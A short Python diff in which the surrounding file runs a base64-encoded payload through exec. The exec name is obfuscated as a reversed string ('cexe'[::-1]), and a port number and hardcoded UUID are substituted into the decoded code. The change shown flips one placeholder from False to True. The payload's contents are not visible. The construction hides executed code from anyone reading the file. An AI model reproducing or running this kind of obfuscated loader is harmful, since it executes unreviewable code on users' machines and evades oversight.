@@ -4,7 +4,7 @@ from base64 import b64decode as de
 if __name__ == "__main__":
     getattr(__builtins__, "cexe"[::-1])(
         de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
-        .replace("fc_", "False")
+        .replace("fc_", "True")
         .replace("iu_", "191cc720-a49d-4612-be7e-9a92eea5bbe3")
         .replace("lv_", "")
         .replace("mv_", "")
